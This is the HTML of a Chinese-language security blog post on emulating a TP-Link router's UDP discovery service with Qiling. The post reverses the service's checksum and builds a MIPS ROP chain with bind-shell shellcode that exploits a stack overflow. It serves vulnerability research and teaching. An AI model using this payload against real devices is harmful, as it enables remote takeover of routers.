@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Emulate_iot_programs_with_qiling_1 | JiansLife</title>
+<meta name="keywords" content="qiling, iot">
+<meta name="description" content="[TOC]
+前段时间挖掘的一个栈溢出漏洞，最近准备用qiling仿真一下顺便写下exp，不过后面发现漏洞已经公开了。
+漏洞简要描述 device_discover 监听 udp端口5001, 处理接收到的数据。
+在数据处理函数protocol_packet_handle中，存在一些校验函数，会对数据进行初步的校验，校验方式基于对数据header特定字节的对比和checksum对比完成。header结构和checksum算法可以通过逆向解析，可以绕过该校验。
+在协议解析函数parse_discovery_frame，parse_advertisement_frame中会调用parse_msg_element 对数据进行解析。parse_msg_element 解析udp中数据时会调用copy_msg_element。
+copy_msg_element函数中未对memcpy长度进行校验，导致栈溢出漏洞。
+int __fastcall copy_msg_element(int a1, void *a2, signed int a3) { if ( !a1 || !a2 || a3 &lt; 0 ) return 1; memcpy(a2, (const void *)(a1 &#43; 4), a3); return 0; } 使用qiling进行仿真 具体实现放在github 上 https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover
+大概需要hook 的一些点：
+device_discover 会 bind br0，这里可以patch 为 lo, 或者添加个虚拟网络接口 br0
+patch
+ql.patch(0x0040BAC0, b&#39;lo\x00&#39;) add br0
+sudo modprobe dummy sudo ip link add br0 type dummy sudo ip addr change dev br0 192.">
+<meta name="author" content="chiba">
+<link rel="canonical" href="https://chibataiki.github.io/posts/emulate_iot_programs_with_qiling_1/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css" integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://chibataiki.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://chibataiki.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://chibataiki.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://chibataiki.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://chibataiki.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Emulate_iot_programs_with_qiling_1" />
+<meta property="og:description" content="[TOC]
+前段时间挖掘的一个栈溢出漏洞，最近准备用qiling仿真一下顺便写下exp，不过后面发现漏洞已经公开了。
+漏洞简要描述 device_discover 监听 udp端口5001, 处理接收到的数据。
+在数据处理函数protocol_packet_handle中，存在一些校验函数，会对数据进行初步的校验，校验方式基于对数据header特定字节的对比和checksum对比完成。header结构和checksum算法可以通过逆向解析，可以绕过该校验。
+在协议解析函数parse_discovery_frame，parse_advertisement_frame中会调用parse_msg_element 对数据进行解析。parse_msg_element 解析udp中数据时会调用copy_msg_element。
+copy_msg_element函数中未对memcpy长度进行校验，导致栈溢出漏洞。
+int __fastcall copy_msg_element(int a1, void *a2, signed int a3) { if ( !a1 || !a2 || a3 &lt; 0 ) return 1; memcpy(a2, (const void *)(a1 &#43; 4), a3); return 0; } 使用qiling进行仿真 具体实现放在github 上 https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover
+大概需要hook 的一些点：
+device_discover 会 bind br0，这里可以patch 为 lo, 或者添加个虚拟网络接口 br0
+patch
+ql.patch(0x0040BAC0, b&#39;lo\x00&#39;) add br0
+sudo modprobe dummy sudo ip link add br0 type dummy sudo ip addr change dev br0 192." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chibataiki.github.io/posts/emulate_iot_programs_with_qiling_1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-07T21:39:26+08:00" />
+<meta property="article:modified_time" content="2022-10-07T21:39:26+08:00" /><meta property="og:site_name" content="JiansLife" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Emulate_iot_programs_with_qiling_1"/>
+<meta name="twitter:description" content="[TOC]
+前段时间挖掘的一个栈溢出漏洞，最近准备用qiling仿真一下顺便写下exp，不过后面发现漏洞已经公开了。
+漏洞简要描述 device_discover 监听 udp端口5001, 处理接收到的数据。
+在数据处理函数protocol_packet_handle中，存在一些校验函数，会对数据进行初步的校验，校验方式基于对数据header特定字节的对比和checksum对比完成。header结构和checksum算法可以通过逆向解析，可以绕过该校验。
+在协议解析函数parse_discovery_frame，parse_advertisement_frame中会调用parse_msg_element 对数据进行解析。parse_msg_element 解析udp中数据时会调用copy_msg_element。
+copy_msg_element函数中未对memcpy长度进行校验，导致栈溢出漏洞。
+int __fastcall copy_msg_element(int a1, void *a2, signed int a3) { if ( !a1 || !a2 || a3 &lt; 0 ) return 1; memcpy(a2, (const void *)(a1 &#43; 4), a3); return 0; } 使用qiling进行仿真 具体实现放在github 上 https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover
+大概需要hook 的一些点：
+device_discover 会 bind br0，这里可以patch 为 lo, 或者添加个虚拟网络接口 br0
+patch
+ql.patch(0x0040BAC0, b&#39;lo\x00&#39;) add br0
+sudo modprobe dummy sudo ip link add br0 type dummy sudo ip addr change dev br0 192."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://chibataiki.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Emulate_iot_programs_with_qiling_1",
+      "item": "https://chibataiki.github.io/posts/emulate_iot_programs_with_qiling_1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Emulate_iot_programs_with_qiling_1",
+  "name": "Emulate_iot_programs_with_qiling_1",
+  "description": "[TOC]\n前段时间挖掘的一个栈溢出漏洞，最近准备用qiling仿真一下顺便写下exp，不过后面发现漏洞已经公开了。\n漏洞简要描述 device_discover 监听 udp端口5001, 处理接收到的数据。\n在数据处理函数protocol_packet_handle中，存在一些校验函数，会对数据进行初步的校验，校验方式基于对数据header特定字节的对比和checksum对比完成。header结构和checksum算法可以通过逆向解析，可以绕过该校验。\n在协议解析函数parse_discovery_frame，parse_advertisement_frame中会调用parse_msg_element 对数据进行解析。parse_msg_element 解析udp中数据时会调用copy_msg_element。\ncopy_msg_element函数中未对memcpy长度进行校验，导致栈溢出漏洞。\nint __fastcall copy_msg_element(int a1, void *a2, signed int a3) { if ( !a1 || !a2 || a3 \u0026lt; 0 ) return 1; memcpy(a2, (const void *)(a1 + 4), a3); return 0; } 使用qiling进行仿真 具体实现放在github 上 https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover\n大概需要hook 的一些点：\ndevice_discover 会 bind br0，这里可以patch 为 lo, 或者添加个虚拟网络接口 br0\npatch\nql.patch(0x0040BAC0, b\u0026#39;lo\\x00\u0026#39;) add br0\nsudo modprobe dummy sudo ip link add br0 type dummy sudo ip addr change dev br0 192.",
+  "keywords": [
+    "qiling", "iot"
+  ],
+  "articleBody": "[TOC]\n前段时间挖掘的一个栈溢出漏洞，最近准备用qiling仿真一下顺便写下exp，不过后面发现漏洞已经公开了。\n漏洞简要描述 device_discover 监听 udp端口5001, 处理接收到的数据。\n在数据处理函数protocol_packet_handle中，存在一些校验函数，会对数据进行初步的校验，校验方式基于对数据header特定字节的对比和checksum对比完成。header结构和checksum算法可以通过逆向解析，可以绕过该校验。\n在协议解析函数parse_discovery_frame，parse_advertisement_frame中会调用parse_msg_element 对数据进行解析。parse_msg_element 解析udp中数据时会调用copy_msg_element。\ncopy_msg_element函数中未对memcpy长度进行校验，导致栈溢出漏洞。\nint __fastcall copy_msg_element(int a1, void *a2, signed int a3) { if ( !a1 || !a2 || a3 \u003c 0 ) return 1; memcpy(a2, (const void *)(a1 + 4), a3); return 0; } 使用qiling进行仿真 具体实现放在github 上 https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover\n大概需要hook 的一些点：\ndevice_discover 会 bind br0，这里可以patch 为 lo, 或者添加个虚拟网络接口 br0\npatch\nql.patch(0x0040BAC0, b'lo\\x00') add br0\nsudo modprobe dummy sudo ip link add br0 type dummy sudo ip addr change dev br0 192.168.100.1 init_sock 内执行 setsockopt(sockfd1, 0xFFFF, 25, optval, 0x20u) 时会失败。\nEPERM 对应为No permissions. 索性直接把函数hook掉了\n[x] Can't convert emu_optname 25 to host platform based optname [=] setsockopt(sockfd = 0x3, level = 0xffff, optname = 0x19, optval_addr = 0x7ff3cd7c, optlen = 0x20) = -0x1 (EPERM) device_discover binding interface:lo. [init_sock:377]: bind interface error. def my_setsockopt(ql: Qiling): print(\"[+] Hooked setsockopt\") ql.os.set_api('setsockopt', my_setsockopt, QL_INTERCEPT.CALL) init_sock 执行完成后直接跳转到解析函数packet_handle\ndef hook_to_packet_handle(ql: Qiling): ql.arch.regs.write(\"pc\", 0x00403978) after_initrsock_addr = 0x004038E8 ql.hook_address(hook_to_packet_handle,after_initrsock_addr) 把ioctl hijack 掉.\n后面存在对ioctl函数返回值的判断。\nif ( ioctl(a1, 0x8915u, a2) \u003e= 0 ) { ... v15 = protocol_handler(a1, \u0026bbuf_for_main, \u0026v26); } def my_ioctl(ql: Qiling): print(\"[+] Hooked ioctl\") return 0 ql.os.set_api('ioctl', my_ioctl,QL_INTERCEPT.CALL) 将 common_timer 函数hook掉\ncommon_timer 中涉及了一些广播包的发送，和数据接受处理逻辑无关，但是会触发sendto的PermissionError ，所以这里先直接绕过了\ncommon_timer() { ... send_discovery_frame(g_para, \u0026bbuf_for_bcast); ... } def hook_common_timer(ql: Qiling): ql.arch.regs.write(\"v0\",0x1) to_common_timer = 0x00403488 ql.hook_address(hook_common_timer,to_common_timer) 或者hijack掉sendto函数也行\ndef my_sendto(ql: Qiling): return 0 ql.os.set_api('sendto', my_sendto,QL_INTERCEPT.CALL) 完成上述步骤之后基本完成了对 device_discover 的仿真，设备会开启udp 端口5001，并对接受的数据进行解析。\n\u003e lsof -i:5001 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME python3 381302 chiba 3u IPv4 638722 0t0 UDP localhost:5001 [+] bind(3,127.0.0.1:5001,16) = 0 [+] syscall bind host: 127.[+] recvfrom() CONTENT: [+] b'aaaaaaaaaa\\n' [+] recvfrom() addr is 127.0.0.1:496260.0.1 and port: 5001 sin_family: 2 如果单纯测试数据处理函数protocol_handler，那么可以直接跳转到protocol_handler进行仿真。\nexp 编写 具体见 https://github.com/chibataiki/IoT_emulating/blob/main/ql_tplink_device_discover/poc.py\n逆向协议结构 上面讲过，函数protocol_handler对输入的udp数据有校验和chksum，所以要先逆向出对应算法\nif ( !data || !a3 ) return 1; if ( *data != 1 ) return -1; v5 = data[1]; v6 = v5 == 0; v7 = v5 \u003c 3; if ( v6 ) return -1; v6 = !v7; result = -1; if ( !v6 ) { result = -1; if ( data[2] == 0xE ) { v8 = data[11] | (data[10] \u003c\u003c 8); result = -1; if ( v8 \u003c 0x5C1 ) { result = -1; if ( *((_DWORD *)data + 1) == 0xE12B83C7 ) 可以推测出大概的data 结构，其中tmp_chksum 和 tmp_len需要根据后面的tlv 数据生成\nheader = \"01010e00e12b83c7\" tmp_chksum = \"0000\" tmp_len = 0 padding = \"0000\" tlv data 数据校验逻辑：\nif ( *((_DWORD *)data + 1) == 0xE12B83C7 ) { data_len = tlv_data_len + 14; ptr = data; left_len = data_len; sum = 0; v13 = 0; do { v13 += 2; sum += *(unsigned __int16 *)ptr; ptr += 2; left_len -= 2; } while ( (int)(data_len - v13) \u003e= 2 ); v14 = HIWORD(sum); if ( left_len != 1 ) goto LABEL_18; for ( sum += *ptr; ; sum = (unsigned __int16)sum + v14 ) { v14 = HIWORD(sum); LABEL_18: if ( !v14 ) break; } if ( (unsigned __int16)sum == 0xFFFF ) return ms_idle_handler(a1, data, 1, a3); 上面的 do while 和 for 函数的逻辑就是chksum 函数。\ndef csum(data): chksum_temp = 0 data_list = [data[i:i+4] for i in range(0, len(data), 4 ) ] for data in data_list: chksum_temp += int(data, 16) hiword_chksumm, loword_chksum = divmod(chksum_temp, 0x10000) chksum_temp = hiword_chksumm+loword_chksum chksum_fin = hex(chksum_temp ^ 0xffff) return chksum_fin 构造rop 确定 ra 的偏移\n使用pwntool的 cyclic\npayload = cyclic(1000, n=4) pwndbg\u003e i r ra ra: 0x79616166 ('yaaf') In [5]: cyclic_find(\"yaaf\",n=4) Out[5]: 596 偏移是 596 个字节\ngadaget 1\n找出给 $a0赋值的指令\nPython\u003emipsrop.find(\"li $a0,1\") --------------------------------------------- | Address | Action | Control Jump | --------------------------------------------- | 0x000512C0 | li $a0,1 | jalr $s1 | ... 第一个 gadaget， 将 $ra 值 指向 000512C0 + base addr\n.text:000512C0 li $a0, 1 .text:000512C4 move $t9, $s1 .text:000512C8 jalr $t9 ; sub_50FC0 gadaget 2\n由于 $s1 寄存器可控，所以第二个gadget 会执行 sleep 函数, 但是为了下一个 gadget，所以需要控制 $ra。\nPython\u003emipsrop.tail() --------------------------------------------- | Address | Action | Control Jump | --------------------------------------------- | 0x00035348 | move $t9,$s2 | jr $s2 ... 可以看到下面的$ra的值可以从栈上获取，且$s2 也可以控制\n.text:00035348 move $t9, $s2 .text:0003534C lw $ra, 0x18+var_sC($sp) .text:00035350 lw $s2, 0x18+var_s8($sp) .text:00035354 lw $s1, 0x18+var_s4($sp) .text:00035358 lw $s0, 0x18+var_s0($sp) .text:0003535C jr $t9 ; 由于需要执行sleep 函数 ，所以 $s2的值设置为sleep 函数地址 000500F0 + base addr\ngadget 3\n上面已经执行完sleep(), 并控制了新的 $ra，所以需要找一个将从stack中取值的的gadget\nPython\u003emipsrop.stackfinder() --------------------------------------------- | Address | Action | Control Jump | --------------------------------------------- | 0x000305B0 | addiu $s3,$sp,0x30+var_18 | jalr $s4 ... 其中 $s3 从栈上获取，对应的就是栈上的shellcode 地址 ，且 $s4 可控。\n.text:000305B0 addiu $s3, $sp, 0x30+var_18 .text:000305B4 move $a0, $s3 .text:000305B8 move $t9, $s4 .text:000305BC jalr $t9 ; .text:000305C0 move $a1, $s1 gadget 4\n上面可以看到 $s3 指向了shellcode 地址，那么 $s4 指向的gadget 就需要执行$s3\nPython\u003emipsrop.find(\"move $t9, $s3\") --------------------------------------------- | Address | Action | Control Jump | --------------------------------------------- | 0x0000B5F0 | move $t9,$s3 | jalr $s3 ... .text:0000B5F0 move $t9, $s3 .text:0000B5F4 jalr $t9 .text:0000B5F8 move $a1, $s0 这里$s4 就为 0x000B5F0 + base addr\ngadget chain\nshellcode = asm(shellcraft.mips.linux.bindsh(2334)) libc_addr = 0x90063000 addr1 = 0x000512C0 addr2 = 0x00035348 addr_sleep = 0x000500F0 addr3 = 0x000305B0 addr4 = 0x0000B5F0 s1 = p32(libc_addr + addr2 ) s2 = p32(libc_addr + addr_sleep) s3 = b\"BBBB\" s4 = p32(libc_addr + addr4) ra = p32(libc_addr+addr1) payload = b\"A\"*580 + s1 + s2 + s3 + s4 + ra + b\"A\"*36 + p32(libc_addr+addr3)+ b\"D\"*24+shellcode 效果 暂时需要使用 qiling 的debug模式，结合gdb ，忽视掉一些\nunicorn.unicorn.UcError: Invalid memory write (UC_ERR_WRITE_UNMAPPED) 问题。\n已经执行到shellcode里了，但是有点小问题。\n[+] bind(5,127.0.0.1:2334,16) = 0 [+] syscall bind host: 127.0.0.1 and port: 2334 sin_family: 2 ... [+] write() CONTENT: b'ls' [+] write() CONTENT: b'Permission denied' \u003e lsof -i:2334 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME python3 417496 chiba 13u IPv4 695587 0t0 TCP localhost:2334 (LISTEN) python3 417496 chiba 14u IPv4 695588 0t0 TCP localhost:2334-\u003elocalhost:43394 (ESTABLISHED) $ nc 127.0.0.1 2334 exit 130 ls sh: ls: Permission denied pwd / help Built-in commands: ------------------- . : alias bg break cd chdir continue eval exec exit export false fg hash help jobs kill let local pwd read readonly return set shift times trap true type ulimit umask unalias unset wait https://github.com/77clearlove/TP-Link-poc\nhttps://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover\nhttps://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf\n",
+  "wordCount" : "939",
+  "inLanguage": "en",
+  "datePublished": "2022-10-07T21:39:26+08:00",
+  "dateModified": "2022-10-07T21:39:26+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "chiba"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://chibataiki.github.io/posts/emulate_iot_programs_with_qiling_1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "JiansLife",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://chibataiki.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://chibataiki.github.io/" accesskey="h" title="JiansLife (Alt + H)">JiansLife</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://chibataiki.github.io/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://chibataiki.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://chibataiki.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://chibataiki.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://chibataiki.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://chibataiki.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Emulate_iot_programs_with_qiling_1
+    </h1>
+    <div class="post-meta"><span title='2022-10-07 21:39:26 +0800 CST'>October 7, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;chiba
+
+</div>
+  </header> 
+  <div class="post-content"><p>[TOC]</p>
+<p>前段时间挖掘的一个栈溢出漏洞，最近准备用qiling仿真一下顺便写下exp，不过后面发现漏洞已经公开了。</p>
+<h2 id="漏洞简要描述">漏洞简要描述<a hidden class="anchor" aria-hidden="true" href="#漏洞简要描述">#</a></h2>
+<p>device_discover 监听 udp端口5001, 处理接收到的数据。</p>
+<p>在数据处理函数protocol_packet_handle中，存在一些校验函数，会对数据进行初步的校验，校验方式基于对数据header特定字节的对比和checksum对比完成。header结构和checksum算法可以通过逆向解析，可以绕过该校验。</p>
+<p>在协议解析函数parse_discovery_frame，parse_advertisement_frame中会调用parse_msg_element 对数据进行解析。parse_msg_element 解析udp中数据时会调用copy_msg_element。</p>
+<p>copy_msg_element函数中未对memcpy长度进行校验，导致栈溢出漏洞。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">copy_msg_element</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>a2, <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> a3)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a1 <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>a2 <span style="color:#f92672">||</span> a3 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  memcpy(a2, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>), a3);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="使用qiling进行仿真">使用qiling进行仿真<a hidden class="anchor" aria-hidden="true" href="#使用qiling进行仿真">#</a></h2>
+<p>具体实现放在github 上  <a href="https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover">https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover</a></p>
+<p>大概需要hook 的一些点：</p>
+<ol>
+<li>
+<p>device_discover 会 bind <code>br0</code>，这里可以patch 为 <code>lo</code>, 或者添加个虚拟网络接口 <code>br0</code></p>
+<ul>
+<li>
+<p>patch</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ql.patch<span style="color:#f92672">(</span>0x0040BAC0, b<span style="color:#e6db74">&#39;lo\x00&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div></li>
+<li>
+<p>add br0</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo modprobe dummy
+</span></span><span style="display:flex;"><span>sudo ip link add br0 type dummy
+</span></span><span style="display:flex;"><span>sudo ip addr change dev br0 192.168.100.1
+</span></span></code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>init_sock 内执行 setsockopt(sockfd1, 0xFFFF, 25, optval, 0x20u) 时会失败。</p>
+<p>EPERM 对应为No permissions.  索性直接把函数hook掉了</p>
+<pre tabindex="0"><code>[x] 	Can&#39;t convert emu_optname 25 to host platform based optname
+[=] 	setsockopt(sockfd = 0x3, level = 0xffff, optname = 0x19, optval_addr = 0x7ff3cd7c, optlen = 0x20) = -0x1 (EPERM)
+
+
+device_discover binding interface:lo.
+[init_sock:377]: bind interface error.
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_setsockopt</span>(ql: Qiling):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+] Hooked setsockopt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ql<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>set_api(<span style="color:#e6db74">&#39;setsockopt&#39;</span>, my_setsockopt, QL_INTERCEPT<span style="color:#f92672">.</span>CALL)
+</span></span></code></pre></div></li>
+<li>
+<p>init_sock 执行完成后直接跳转到解析函数packet_handle</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hook_to_packet_handle</span>(ql: Qiling):
+</span></span><span style="display:flex;"><span>    ql<span style="color:#f92672">.</span>arch<span style="color:#f92672">.</span>regs<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;pc&#34;</span>, <span style="color:#ae81ff">0x00403978</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>after_initrsock_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004038E8</span>
+</span></span><span style="display:flex;"><span>ql<span style="color:#f92672">.</span>hook_address(hook_to_packet_handle,after_initrsock_addr)
+</span></span></code></pre></div></li>
+<li>
+<p>把ioctl hijack 掉.</p>
+<p>后面存在对ioctl函数返回值的判断。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ioctl(a1, <span style="color:#ae81ff">0x8915u</span>, a2) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	...
+</span></span><span style="display:flex;"><span>	v15 <span style="color:#f92672">=</span> protocol_handler(a1, <span style="color:#f92672">&amp;</span>bbuf_for_main, <span style="color:#f92672">&amp;</span>v26);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_ioctl</span>(ql: Qiling):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+] Hooked ioctl&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ql<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>set_api(<span style="color:#e6db74">&#39;ioctl&#39;</span>, my_ioctl,QL_INTERCEPT<span style="color:#f92672">.</span>CALL)
+</span></span></code></pre></div></li>
+<li>
+<p>将 common_timer 函数hook掉</p>
+<p>common_timer 中涉及了一些广播包的发送，和数据接受处理逻辑无关，但是会触发sendto的PermissionError ，所以这里先直接绕过了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>common_timer()
+</span></span><span style="display:flex;"><span>{ 
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  send_discovery_frame(g_para, <span style="color:#f92672">&amp;</span>bbuf_for_bcast);
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>def hook_common_timer(ql: Qiling)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    ql.arch.regs.write(<span style="color:#e6db74">&#34;v0&#34;</span>,<span style="color:#ae81ff">0x1</span>)
+</span></span><span style="display:flex;"><span>to_common_timer <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x00403488</span>
+</span></span><span style="display:flex;"><span>ql.hook_address(hook_common_timer,to_common_timer)
